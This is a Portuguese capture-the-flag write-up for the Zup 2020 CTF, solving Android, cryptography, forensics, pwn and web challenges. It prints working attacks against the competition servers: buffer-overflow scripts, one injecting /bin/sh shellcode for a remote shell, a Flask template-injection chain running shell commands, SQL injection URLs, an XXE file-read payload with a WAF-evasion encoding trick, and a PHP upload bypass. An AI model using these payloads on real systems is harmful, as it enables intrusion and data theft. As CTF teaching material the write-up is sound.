# :triangular_flag_on_post: CTF Zup 2020  Write up 1#


Este documento contém todas as respostas (passo a passo) e ferramentas utilizadas para resolução 
dos desafios do CTF Zup 2020, ou pelo menos aqueles que eu consegui resolver :rofl:

### Categorias
1. [Android](#debug-me)
    - [Debug](#debug-me)
    - [Decode](#decode)
    - [Db leak](#db-leak)
    - [Export](#exported)
    - [File access](#file-access)
    - [Dynamic Instrumentation](#dynamic-instrumentation)
    - [Intercept](#intercept)
    - [Resources](#resources)
    - [Shared preferences](#shared-preferences)
    - [Smali Inject](#smali)
    - [Strings](#strings)
2. [Criptografia](#not-a-caesar-algorithm)
    - [Not a caesar algorithm](#not-a-caesar-algorithm)
3. [Forense](#pdf-crypt)
    - [Pdf crypt](#pdf-crypt)
    - [A lost pendrive](#lost-pendrive)
    - [Unk](#unk)
4. [Misc](#log-access)
    - [Log Access](#log-access)
    - [Rotate](#rotate)
5. [Pwns](#pwn1)
    - [Pwn1](#pwn1)
    - [Pwn2](#pwn2)
    - [Pwn3](#pwn3)
    - [Pwn4](#pwn4)
6. [Aplicações Web](#awesome-cats)
    - [Awesome cats](#awesome-cats)
    - [Login bypass](#login-bypass)
    - [Easy one](#easy-one)
    - [Easy two](#easy-two)
    - [Fucking](#fucking)
    - [I hate flask](#i-hate-flask)
    - [LFI](#lfi)
    - [Look Closer](#look-closer)
    - [Nice site](#nice-site)
    - [Perl](#perl)
    - [Potatoe is good](#potatoe-is-good)
    - [Server status (SSRF)](#server-status)
    - [Unsafe Entity (XXE)](#xxe)
7. [Ferramentas](#android-studio)

## Android :iphone: ##

### Debug me
O desafio debug pede para que seja exibida uma flag que foi logada pela aplicação, e portanto foi necessário apenas executar o APK em uma máquina virtual e atrelar o dispositivo/apk ao logcat no [Android Studio](#android-studio), vendo o filtro marcado com debug e acionar o botao para "debug" na activity do desafio, dentro do app.
![Android Studio Log](/android/debug-me.png)


### Decode
O desafio decode indica que o APK deve ser decompilado pois a flag foi compilada junto ao código. Para decompilar o APK de maneira mais fácil possível utilizei uma ferramenta online chamada [APK Decompilers](#apk-decompilers) e então bastou abrir o arquivo Decode.java e lá estava a nossa flag, dividida em três trechos de base64, que juntos formam o valor WlVQLXtoMHU1MyAwZiBjNHJkNX0= ou ZUP-{h0u53 0f c4rd5}
![Decode.java](android/decode.png)

### Db Leak
O desafio db leak indica que há uma chave escondida dentro do banco de dados do APP. Estando o app rodando numa VM em execução no [Android Studio](#android-studio), basta abrir a View "Device File Explorer" e acessar a pasta data/data/com.revo.evabs/databases e copiar o arquivo mainframe_access. Ao abrir este arquivo com a ferramenta [SQLite Browser](#sqlite-browser) foi possivel visualizar a chave, dentro do aba de dados
![DB Leak](android/db-leak.PNG)

### Exported
Com o APK já decompilado, no desafio exported foi citado que havia uma activity escondida dentro do APP, que estava vulnerável por ser marcada como "exported". Dentro do Manifest.xml portanto foi possível ver o nome dessa activity, que era

```xml
<activity android:exported="true" android:name="com.revo.evabs.ExportedActivity"/>
```
Com o app em execução e fazendo uso da ferramenta [ADB/SDK Platform Tools](#adb) foi possível mandar executar esta activity com uma linha de comando

```shell
adb shell am start -n com.revo.evabs/com.revo.evabs.ExportedActivity
```
![Starting activity](android/export.png)

### File access
Para concluir este desafio basta renomear a APK para .zip e acessar a pasta de assets, dentro desta está o arquivo secret que pode ser aberto com o notepad para encontrar a nossa flag.
![Assets in renamed apk](android/assets.png)

### Dynamic instrumentation
Este desafio certamente trata de algum conceito do Android e/ou Mobile em geral. Mas será que seria mesmo necessário conhecê-lo para ter acesso à nossa flag?
Com o APK já decompilado, procurei pela Activity do desafio e a encontrei em com.revo.evabs.Frida1.java e vi o trecho relevante para a nossa busca

```Java
public class Frida1 extends AppCompatActivity implements OnClickListener {
    int a = 25;
    int b = 2;
    int x;
    public native String stringFromJNI();
    ...
    if (this.x > rand) {
        tv.setText("VIBRAN IS RESDY TO FLY! YOU ARE GOING HOME!");
        Log.d("CONGRATZ!", stringFromJNI());
        return;
    }
    ...
    static {
        System.loadLibrary("native-lib");
    }
}
```

E então descubro que a flag vem do método stringFromJNI() e que bastaria executá-lo para ter acesso a flag, mas o que é ele? 
Ao estudar um pouco sobre, descubro que o código que implementa stringFromJNI na verdade está contido no arquivo \lib\x86\libnative-lib.so mas ao abrí-lo não é possível ler nada. Isso significa que não temos acesso ao código, certo? 
Bem, na verdade os métodos definidos podem ser acessados desde que a classe que esteja invocando tenha o mesmo nome e estrutura de pacote (JNI) definido na lib.
Criei então um projeto hello world simples no [Android Studio](#android-studio) e transformei a minha "HelloWorldActivity.java" em "Frida1.java", adicionando também a nossa native-libs.so nesse projeto e definindo o mesmo método nativo stringFromJNI(), basta rodar e ver a flag sendo printada no logcat!

![Who needs instrumenwhatever](android/instrumentation.png)

### Smali
A Activity deste desafio nos diz que uma variável precisa ser atualizada e o app recompilado, para que a flag seja exibida. Ao acessar sua Activity, novamente vejo que a flag está, na realidade, também no arquivo native-libs.so

```Java
public class SmaliInject extends AppCompatActivity {
    String SIGNAL = "LAB_OFF";
    public native String stringFromSmali();
    ...
    public void onCreate(Bundle savedInstanceState) {
        ...
            String ctrl = SmaliInject.this.stringFromSmali();
            if (SmaliInject.this.SIGNAL.equals("LAB_ON")) {
                StringBuilder sb = new StringBuilder();
                sb.append("ZUP-{");
                sb.append(ctrl);
                sb.append("}");
                textView.setText(sb.toString());
            }
        ...
    }
    static {
        System.loadLibrary("native-lib");
    }
}
```
Aproveitando a solução feita no desafio [Dynamic Instrumentation](#dynamic-instrumentation), renomeei a "HelloWorldActivity.java" para "SmaliInject.java"
e defini o mesmo método nativo stringFromSmali(), rodei e vi a flag sendo printada no logcat, novamente!

![Who needs to recompile](android/smali.png)


### Intercept
O desafio intercept cita que há um request sendo feito toda vez que acionamos um determinado botão do app. Estando com o APP rodando em VM, no ambiente do [Android Studio](#android-studio) basta abrir a View 'Profiler' da IDE e criar uma sessão atrelada ao dispositivo virtual (vm) e ao processo (nosso apk). Esse recurso começa então a monitorar tanto os pacotes enviados quanto cpu, energia e memória do aparelho (vm). Logo ao acionar o botão para executar o request este pode ser visto em detalhes na IDE.
![Request interception](android/request-interception.png)

### Resources
O desafio resources, similar ao file access, também só precisa do apk renomeado para a extensão zip. Dessa forma basta acessar o diretório res/raw e lá está a flag.
![Resources](android/resources.png)

### Shared preferences
Para o desafio shared preferences ser resolvido, precisei do APP rodando em VM, no ambiente do [Android Studio](#android-studio) e então bastou abrir a View 'Device File Explorer' e acessar o arquivo data/data/com.revo.evabs/shared_prefs/DETAILS.xml (ele só é criado após a execução do app pelo menos uma vez e atribuição do nome na primeira tela)
![Shared preferences is not safe](android/shared-preferences.png)

### Strings
Com o APK já decompilado, após fazer uso da ferramenta [APK Decompilers](#apk-decompilers) bastou abrir o arquivo disponível em res\values\strings.xml
![Strings.xml](android/strings.png)

## Criptografia :key:

### Not a caesar algorithm ##
Esse desafio nos dá uma flag aparentemente criptografada e a única dica é que não se trata de um algoritmo de cifra de césar. Fazendo uso da ferramenta online [Dcode.fr](#dcode) e testando alguns algoritmos através de força bruta, em pouco tempo foi possível descobrir que se tratava do algoritmo Affine.
![dCode rules](crypt/affine.png)

## Forense :mag:

### Pdf crypt ###
Este desafio se trata de um arquivo pdf criptografado e com senha para acesso. Para acessá-lo foi tão simples quanto fazer uso da ferramenta online [IlovePDF](#ilovepdf)
![Are encrypted pdf safe? I'm not sure anymore](forensics/pdf.png)

### Lost pendrive ###
Este desafio disponibliza um arquivo zip de aprox 25MB e fala que é proveniente de um pendrive achado na rua... Ao abrir o arquivo no winrar é possível ver que o conteúdo é um arquivo sem extensão alguma, e com quase 4GB de tamanho *(?)*. Após achar bastante suspeito abro este arquivo com o editor Hexadecimal [HxD](#hxd) e vejo vários trechos nulos
![Lost pendrive looks bigger than it is](forensics/hex-lost-pendrive.png)
Apago esses valores nulos (00) apenas para tornar o arquivo de mais fácil manipulação, com isso o seu tamanho real cai bastante (26mb pelo menos). Ainda no editor hexadecimal percebo alguns indícios de que esse arquivo é uma imagem, pois dentro dele existem vários arquivos e pastas. O renomeio para .bin e faço uso da ferramenta [OSF Mount](#osf-mount) para montar a imagem como uma unidade de disco, e lá dentro achamos nossa flag, dentro do rar passwords.txt.zip
![Lost pendrive looks bigger than it is](forensics/mount-lost-pendrive.png)

### Unk ###
Esse desafio é um arquivo sem extensão alguma. Ao abrí-lo com o editor hexadecimal [HxD](#hxd) é possível ver algumas estruturas de um arquivo docx, arquivos xml comuns a esse tipo de arquivo. Bastou então renomear o arquivo para unk.docx e abrí-lo no Microsoft Word. O Word irá alertar que o arquivo contém informações ilegíveis e possibilita recuperar o documento automaticamente, e ele mesmo consegue fazer o trabalho.
O nosso unk na verdade era mesmo um docx!
![Unk file nice song](forensics/unk.png)

## Misc :earth_americas:

### Log Access ###
Este desafio disponibliza um arquivo zip contendo um arquivo de texto com extensão .ctf. Ao abrir o arquivo na ferramenta [Notepad++](#notepad++) e analisar "no olho" (é um arquivo pequeno) na linha 110 do arquivo há o log de um request contendo um parâmetro bem extenso. Após analisar cheguei na função javascript abaixo

```Javascript
var revealLogAccess = (x) => eval(decodeURIComponent(x).replace(/(.*)(String\.fromCharCode\(.*\))(.*)/,"$2"))
```
que recebendo a url completa da linha 110 como parâmetro nos retorna a tão desejada flag 
![Log access flag](misc/log-access.png)


### Rotate ###
Este desafio nos dá um texto cifrado, e também a dica de que ele foi rotacionado n e após y vezes. Bastou então fazer uso da ferramenta [dCode](#dCode) utilizando o recurso [ROT Cipher](https://www.dcode.fr/rot-cipher) e aplicando o número de rotações indicado no desafio para obter a flag final! 

## Pwns :computer:

### Pwn1 ###
Este desafio nos dá um arquivo sem extensão alguma, e também uma instrução shell
```shell
nc 18.228.166.40 4321
```
Se trata de um comando da ferramenta [netcat](#netcat), ao executar é possível ver um diálogo. O mesmo diálogo está dentro do arquivo disponibilizado, logo a conclusão é
que este arquivo é um executável e que o servidor indicado está rodando este mesmo arquivo. Agora como descobrir o funcionamento dele?
A ferramenta utilizada foi a [OnlineDisassembler](#online-disassembler) para abrir esse arquivo, e então temos que na imagem abaixo é possível ver a condicional necessária
para a execução da função 'print_flag' que provavelmente é a nossa função desejada.
![Log access flag](pwn/pwn1-step1.png)
Para fazer essa condicional ser atingida (o valor informado à esquerda também ser atribuído o hexa 0xDEA110C8 precisamos causar um buffer overflow)

O código em Python abaixo foi executado utilizando o [Python3](#python3) em um ambiente linux no [docker](#docker) e realiza exatamente esse trabalho, 
fazendo uso também da lib [pwntools](#pwntools)

```python
from pwn import *
context.log_level = 'debug'
p = remote('18.228.166.40',4321)
flag = "\xc8\x10\xa1\xde"

log.info(p.recvuntil('What... is your name?'))
p.sendline(str('Sir Lancelot of Camelot'))
log.info(p.recvuntil('What... is your quest?'))
p.sendline('To seek the Holy Grail.')
sleep(1)
log.info(p.recvuntil('What... is my secret?'))

p.sendline("A" * 43 + flag)
p.interactive()
```

### Pwn2 ###
Este desafio também é bastante similar ao anterior. Nosso comando shell agora é
```shell
nc 18.228.166.40 4322
```
Ao analisar o código executável pelo site [OnlineDisassembler](#online-disassembler) é possível ver uma função de nome 'select_func', que é chamada dentro da função main.
E também é possível ver a nossa função de nome print_flag, homônima à nossa função do desafio anterior.
![Desired function](pwn/pwn2-step1.png)
Dado que temos o endereço da função que desejamos executar, basta fazer o overflow e atribuir esse endereço para que select_func chame ela para nós.
O código em shell abaixo faz esse trabalho

```shell
echo -e "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd8" |  nc 18.228.166.40 4322
```

### Pwn3 ###
Parece que todos os desafios pwn vão ser baseados em buffer overflow, mas esse agora nos retorna um endereço de forma dinâmica.
```shell
nc 18.228.166.40 4323
```
Retorna, a cada execução, um endereço diferente, e nos diz que esse endereço irá nos ajudar na solução.
```shell
nc 18.228.166.40 4323
Take this, you might need it on your journey 0xfff384be!
ok
nc 18.228.166.40 4323
Take this, you might need it on your journey 0xffb7dace!
damn it
```
Ao analisar o código "decompilado" é possível ver que o que nós escrevemos como input é atribuído ao endereço retornado,
e se então nós escrevermos um código shell nesse endereço e então pular para esse endereço?
O código python abaixo realiza exatamente essa função


```python
#!/usr/bin/env python3
from pwn import *
import re

def getAddress(out):
    memAddress = re.sub(r'(.*0x)(.{8})(.*)', r'\2', out.decode('utf-8')); #regex to extract memAddrs
    return p32(int(memAddress, 16))

if __name__ == '__main__':
    e = remote("18.228.166.40", 4323)
    out = e.recvline()
    addr = getAddress(out)
    print(("[+] Memory Address is: ").encode() + addr)

    payload = b'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' # /bin/sh
    payload +=b'A'*281 #causing the buffer overflow
    payload += addr #finally set the address
    print(e.sendline(payload))
    e.interactive()
```

E como resultado agora temos acesso ao sh no servidor remoto, bastando então executar o cat flag.txt (o exemplo abaixo mostra um print em execução localhost)
![Pwn 3 on localhost](pwn/pwn3-step1.png)


### Pwn4 ###
Este desafio também nos dá um arquivo sem extensão alguma, e outra instrução shell
Fazendo a execução do shell diretamente no [netcat](#netcat) o código nos informa que se trata de um "ls" as a service, ou seja, ele nos fornece a opção de rodar um ls passando os parâmetros que desejarmos. O comando ls lista os arquivos e pastas do diretório atual, para listar então os conteúdos desses arquivos utilizei o script abaixo

```shell
-a | xargs cat
```

E considerando que se trata de um LS as a service o comando ficaria 

```shell
ls -a | xargs cat
```

nos retornando como output o conteúdo de todos os arquivos da pasta, incluindo a nossa flag.txt!

## Aplicações Web :globe_with_meridians:

### Awesome Cats ###
Este desafio nos apresenta um site aparentemente estático, cheio de gatos em todos os menus, ao inspecionar as páginas encontrei um comentário dentro da página cats-fat.html
onde é mencionado um arquivo de 'to do'. A partir desse arquivo foi possível seguir uma trilha de dicas, para chegar na flag a trilha abaixo foi seguida

```html
http://54.94.193.248:12001/cats-fat.html <!-- Aqui encontrei a linha mencionando secret/todo.md -->
.../todo.md <!-- Aqui encontrei um arquivo mencionando um todo 'estudar robots.txt' -->
.../robots.txt <!-- O robots menciona o arquivo journal.md -->
.../journal.md <!-- Finalmente nesse arquivo encontramos nossa flag! -->
```

### Login Bypass ###
Este desafio nos apresenta uma página de login do qual desconhecemos o usuário e senha, porém nos apresenta também um menu para cadastro. Nesse menu, no entanto, é necessário um código numérico de 6 dígitos para permitir que façamos o cadastro. A página apresenta ainda um captcha mas que não é efetivo pois aparentemente não bloqueia as requisições.
Para realizar então um ataque de força bruta e testar todas as possibilidades eu criei um arquivo .txt contendo todas as opções de código possíveis, executando para isso o javascript abaixo

```javascript
String.prototype.padZero= function(len, c){
    var s= this, c= c || '0';
    while(s.length< len) s= c+ s;
    return s;
}
Array.from({ length: 1000000 }, (v, i) => i.toString().padZero(6).toString());
```
para realizar os testes com o código 000000 até 999999 utilizei a ferramenta [OWASP ZAP 2.9.0](#owasp-zap) bastou então executar uma tentativa manual e configurar o parâmetro 'código' para ser dinâmico a cada request (utilizando o recurso Fuzz), lendo do arquivo de texto criado acima. Em poucos minutos o cadastro estava efetivado, restando então fazer o login e pegar a flag.

### Easy one ###
Este desafio nos retorna uma página html aparentemente normal. A flag estava contida, na verdade, em um header chamado 'flag'. É possível ver mais facilmente utilizando a ferramenta [Postman](#postman)

### Easy two ###
Este desafio nos retorna uma página com um formulário de login. Ao inspecionar a página é possível ver um campo hidden aparentemente um booleano, ao trocar de 0 para 1 e submeter o formulário a flag é exibida. 

### Fucking ###
Este desafio também nos retorna uma página com um formulário de login, mas ao inspecionar é exibido um código javascript extremamente bizarro, composto somente pelos caracteres ([!+{}]). Ao procurar sobre esse tipo de código descubro que é chamado de Brainfuck, e encontro um desofuscador chamado [JSFuck Decoder](#js-fuck-decoder) bem útil, que em instantes conseguiu transformar o javascript em algo legível que exibia uma lógica bem simples, algo similar 
```javascript
if(document.getElementByName("username").value === "foo" && document.getElementByName("password").value === "bar")
```
colocando então os valores de usuário e senha no formulário a flag é exibida

### I Hate Flask ###
Esse desafio nos apresenta uma página bastante simples, com somente um index e uma mensagem 
```html
I love Flask & Flask
```
E nos dá a dica também que este sistema é construído utilizando o framework Flask.
Ao consultar sobre vulnerabilidades nesse framework encontro uma chamada Server-Side Template Injection (SSTI) e resolvo testá-la no site. Envio então um parâmetro arbitrário quetry string de nome 'name', com valor 'Leo' e de fato percebo que a saudação da página é influenciada por esse query.
```html
I love Flask & Leo
```
Parece que estamos no caminho certo, então descubro que é possível injetar código Python no template através dessa query, e seguindo então o passo a passo abaixo nós 'navegamos' na estrutura de classes disponíveis no servidor, partindo de uma simples string vazia.

```html
http://iloveflask.zup.com.br/?name={{%27%27.__class__.__mro__[1].__subclasses__()}} <!-- Aqui descubro que a classe Python desejada POpen está disponível no índice 222-->
http://iloveflask.zup.com.br/?name={{%27%27.__class__.__mro__[1].__subclasses__()[222]}} <!-- Acesso ela -->
http://iloveflask.zup.com.br/?name={{%27%27.__class__.__mro__[1].__subclasses__()[222](%27ls%27,shell=True,stdout=-1).communicate()}} <!-- Fazendo uso dela para executar um ls -->
http://iloveflask.zup.com.br/?name={{%27%27.__class__.__mro__[1].__subclasses__()[222](%27cat%20flag.txt%27,shell=True,stdout=-1).communicate()}} <!-- Agora sim, nossa flag.txt -->
```

É exibida no próprio template da página! <3

```html
I love Flask & ZUP-CTF{Eu_4ind4_4M0_FLaSK_SST1}
``` 

### LFI ###
Este desafio nos apresenta uma página simples html, porém com um comentário bem interessante ao inspecionar o html
```html
<!-- file657354.php?abrir= -->
``` 
Acesso então essa página file657354.php e passo como parâmetro para a query 'abrir' a própria página php, e portanto conseguimos ver o seu código fonte.
```html
<!-- file657354.php?abrir=file657354.php -->
``` 
Neste código fonte descobrimos que através do parâmetro abrir conseguimos ler arquivos do servidor que são printados de volta, porém não é possível ler nada que não esteja no próprio diretório pois há um if bloqueando o acesso a pastas em diretórios acima do dir atual "../". Mas descobrimos também que existem outros dois parâmetros, que nos permite criar um arquivo no servidor, definindo sua extensão e conteúdo. Esse trecho de código, porém, nos bloqueia de criar arquivos com extensão .php e/ou .htm.

Não há restrições, porém, para criarmos um arquivo .htaccess, arquivo esse que permite o servidor reconhecer outras extensões como sendo código php válido e executar esse código antes de servir a página ao cliente. Crio então um arquivo similar ao abaixo, fazendo uso do file657354.php com os parâmetros nomeArquivo e conteudoArquivo

.htaccess
```html
AddType application/x-httpd-php .leolana
``` 
Agora o servidor irá reconhecer arquivos de extensão .leolana como php válido. Basta então executar novamente um post no arquivo file657354.php passando agora um código php que faça um scandir('') e nos retorne o conteúdo do diretório. E dessa forma, navegando na estrutura de pastas do servidor é possível encontrar a flag em um txt, a um nível acima, bastando então alterar constantemente o conteúdo do arquivo .leolana criado a cada nova descoberta e chegar finalmente na nossa flag.


### Look Closer ###

Esse desafio nos retorna uma página html estática bem simples com uma imagem e aparentemente mais nada. Mas ao olhar com cautela ou mesmo inspecionando a página é possível ver que a flag simplesmente estava com a cor branca camuflada no fundo da página também branco.

### Nice Site ###

Esse desafio nos apresenta uma página html com um javascript que tem como única função travar o nosso acesso/browser. Porém logo no primeiro request eu já havia realizado via postman, de modo que o javascript não foi executado e portanto não tive nenhum obstáculo para encontrar a flag.

### Perl ###

Esse desafio nos apresenta uma página bem simples com três links, um hello world, um formulário de dois inputs text e uma página de upload de arquivos.
A nossa página de interesse é justamente a página de upload de arquivos. Tudo que é submetido ao servidor essa página printa de volta no corpo da resposta.
Estudando um pouco sobre perl vejo o funcionamento da função que provavelmente é usada no codigo, já que sei que a página está trabalhando com leitura de arquivos. Descubro uma brecha que faz uso do [ARGV](http://kentfredric.github.io/blog/2016/01/01/re-the-perl-jam-2-argv-is-evil/), e daí basicamente os próximos passos foram, fiz uso da ferramenta
[Burp Suite](#burp-suite-community-edition), do recurso de interceptador.
Abrindo a ferramenta acessamos o browser normalmente, porém habilitamos a opção 'interceptador' dentro da ferramenta. Faço então o request normalmente, enviado na url o nome do arquivo que eu suspeito ser o alvo/desejo abrir

```html
POST http://challenges.ctfd.io:30167/cgi-bin/file.pl?/flag
``` 
E anexo um arquivo qualquer.
Ao submeter a requisição o Burp logo notifica, como se tivesse fazendo um debug na requisição que dependesse do usuário 'soltar o breakpoint', exibindo todos os dados do request. O trecho que nos interessa é o

```html
---------------------------------------------------2313300055123995
Content-Disposition: form-data; name="file"; filename="exemplo.txt"

Meutesteexploitperl
---------------------------------------------------2313300055123995
``` 

Altero para que fique conforme abaixo

```html
---------------------------------------------------2313300055123995
Content-Disposition: form-data; name="file"

ARGV
---------------------------------------------------2313300055123995
Content-Disposition: form-data; name="file"; filename="exemplo.txt"

Meutesteexploitperl
---------------------------------------------------2313300055123995
``` 

E e mando o Burp deixar seguir o request agora alterado. Dessa forma o servidor me retorna, em vez do conteudo do arquivo exemplo.txt que eu submeti o conteúdo do arquivo flag, contido no próprio servidor remoto : ZUP-CTF{P3rl_6_iz_!!12} <3

### Potatoe is Good ###

Este site nos exibe um formulário de login com apenas um campo username, dizendo que é apenas para usuários pré registrados.
Abro logo a ferramenta [OWASP ZAP 2.9.0](#owasp-zap) e mando executar uma varredura (essa funcionalidade testa, dentro de algumas outras coisas, injeções sql). Instantaneamente
é possível ver que o login foi feito com sucesso, e então continuo a navegação manualmente. Vejo uma página de listagem de batatas que nos provê a opção de filtrar pelo nome. Já sabendo que a página era vulnerável a SQL Injection segui então o passo a passo abaixo (após perceber em um erro printado pelo servidor que o banco usado é MySQL)

```html
<!-- Mapeando as tabelas do banco -->
https://potatogods.zup.com.br/search?potatoes=blue%25%27 UNION  select table_name as potato, 1 AS ok FROM information_schema.tables%23 

<!-- Mapeamos então as colunas da tabela suspeita 'flaggyflagflagnotgonnaspotthis' -->
https://potatogods.zup.com.br/search?potatoes=blue%25%27 UNION  select COLUMN_NAME as potato, 1 AS ok FROM  INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'flaggyflagflagnotgonnaspotthis' %23 

<!-- Por fim conseguimos saber onde procurar nossa flag -->
https://potatogods.zup.com.br/search?potatoes=blue%25%27 UNION  select flag as potato, troll AS ok FROM  flaggyflagflagnotgonnaspotthis %23

``` 
E agora em vez de nos listar apenas batatas azuis o site nos lista também a flag <3

### Server Status ###
Este site nos exibe um formulário com apenas um campo, onde precisamos informar uma url,  e o site nos dá uma dica: "esse site faz requests/consegue ler códigos de outras páginas".

Ao submeter um primeiro teste passando o site da google como parâmetro, o mesmo é retornado no corpo do nosso site vulnerável
```html
URl : http://google.com.br

//Trecho do corpo do site google.com é retornado
``` 
O nosso alvo então é um endereço que nós não conseguiríamos executar, se não fôssemos o próprio servidor, ou seja, requisições em sua rede local.
Após alguns testes chego na url abaixo
```html
URl : localhost:80/server-status
//E aqui achamos nossa flag: ZUP-CTF{TH3_S_3r_v3r_is_UP}
``` 

### XXE ###
Este desafio nos exibe um site com alguns menus, que trata basicamente de um sistema de cadastro de usuários. O título do desafio menciona 'entidade insegura', o nome da vulnerabilidade, bem como um menu do site nos conta o nome do arquivo desejado : "flag.txt".
A brecha se encontra em uma página onde o servidor nos permite fazer o upload de um xml, e o servidor devolve na resposta esse mesmo xml printado no corpo.
O que nós precisamos fazer então é definir uma entidade XML falsa, onde o seu valor é lido de um arquivo existente no servidor. Isso pode ser feito através do xml abaixo

```xml
<?xml version="1.0"?>
<!DOCTYPE sei [ <!ENTITY myentity SYSTEM "file:///flag.txt" > ]>
...
<name>&myentity;</name>
```

E referenciar o valor em algum pedaço do corpo desse xml, com a intenção que ele seja printado de volta no retorno do servidor. Porém ao submeter esse arquivo recebemos uma mensagem de bloqueio de WAF.
Voltando aos estudos, descubro que alguns WAF's não conseguem interpretar arquivos em encodings não convencionais, tento então alterar o encoding do xml para UTF-16 fazendo uso da ferramenta [wxMEdit](#wxmedit)

```xml
<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE sei [ <!ENTITY myentity SYSTEM "file:///flag.txt" > ]>
...
<name>&myentity;</name>
```

E agora tudo funciona! O WAF não bloqueia mais, e o arquivo flag.txt realmente é lido. O problema, porém, é que o campo name é demasiado pequeno para retornar o conteúdo.
Após navegar mais pelo site vejo que existe um outro atributo <intro> que não havia sido adicionado no xml de exemplo que obtemos para fazer os requests. Adiciono então manualmente esse atributo e testo novamente.

```xml
<?xml version="1.0" encoding="UTF-16"?>
<!DOCTYPE sei [ <!ENTITY myentity SYSTEM "file:///flag.txt" > ]>
<users>
<user>
<password>Hello</password>
<name>&myentity;</name>
<email>&myentity;</email>
<group>&myentity;</group>
<intro>&myentity;</intro>
</user>
</users>
```
E agora sim o servidor nos retorna nossa tão desejada flag! :D


# Ferramentas :hammer: # 

### Android Studio ###
IDE para desenvolvimento Android disponível neste [link](https://redirector.gvt1.com/edgedl/android/studio/install/4.1.0.19/android-studio-ide-201.6858069-windows.exe) 
### APK Decompilers ###
Ferramenta online para decompilar apks disponível [em](https://www.apkdecompilers.com/)
### SQLite Browser ###
Ferramenta para visualizar arquivos SQLite disponível [em](https://download.sqlitebrowser.org/DB.Browser.for.SQLite-3.12.0-win64.msi)
### ADB ###
Ferramenta cli para interagir/conectar com dispositivos Android via CMD disponível [em](https://dl.google.com/android/repository/platform-tools_r30.0.4-windows.zip)
### dCode ###
Ferramenta online para decriptografia com vários algoritmos disponíveis bem como força bruta, disponível [em](https://www.dcode.fr/)
### ILOVEPDF ###
Ferramenta online que permite abrir pdfs criptografados, disponível no [link](https://www.ilovepdf.com/unlock_pdf)
### HXD ###
Ferramenta de editor Hexadecimal disponível [em](https://mh-nexus.de/downloads/HxDSetup.zip)
### OSF Mount ###
Ferramenta para montar imagem bin em um diso virtual, disponível [em](https://www.osforensics.com/downloads/osfmount.exe)
### Notepad++ ###
Editor de texto preferido de alguns devs, disponível [em](https://notepad-plus-plus.org/downloads/)
### Netcat ###
Ferramenta de rede para conexões TCP/UDP, instalada em ambiente linux através do comando
```shell
apt install netcat
```
### Online Disassembler ###
Ferramenta online para visualizar as instruções de um arquivo ELF compilado disponível [em](https://onlinedisassembler.com/odaweb/)
### Python3 ###
Versão do python utilizada instalada em ambiente linux através do comando abaixo
```shell
apt-get install python3
apt-get install python3-pip
```
### Pwntools ###
Framework python voltado para CTF's disponível [em](https://github.com/Gallopsled/pwntools)
### Docker ###
Ferramenta de container que dispensa comentários disponível [em](https://desktop.docker.com/win/stable/Docker%20Desktop%20Installer.exe)
### OWASP ZAP ###
Ferramenta muito robusta para pentest disponível [em](https://github-production-release-asset-2e65be.s3.amazonaws.com/36817565/02bfc080-3941-11ea-809a-e1c3d98c36a5?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=AKIAIWNJYAX4CSVEH53A%2F20201010%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20201010T113221Z&X-Amz-Expires=300&X-Amz-Signature=71713c9794adf65523b3f20aa1a25bd4e5e86b12fc14f1773f5769b5ddd1d8e2&X-Amz-SignedHeaders=host&actor_id=28098259&key_id=0&repo_id=36817565&response-content-disposition=attachment%3B%20filename%3DZAP_2_9_0_windows.exe&response-content-type=application%2Foctet-stream)
### Postman ###
Ferramenta para realizar requests Restful/automações de chamadas de API's disponível [em](https://dl.pstmn.io/download/latest/win64)
### JS Fuck Decoder ###
Ferramenta para desofuscar um javascript 'fuck' disponível online [em](https://enkhee-osiris.github.io/Decoder-JSFuck/)
### Burp Suite Community Edition ###
Ferramenta para busca de vulnerabilidades web disponível [em](https://portswigger.net/burp/releases/community/latest)
### wxMEdit ###
Ferramenta para edição de texto/hexadecimal disponível [em](https://megalink.dl.sourceforge.net/project/wxmedit/3.1/wxMEdit-3.1-win32-bin.7z)
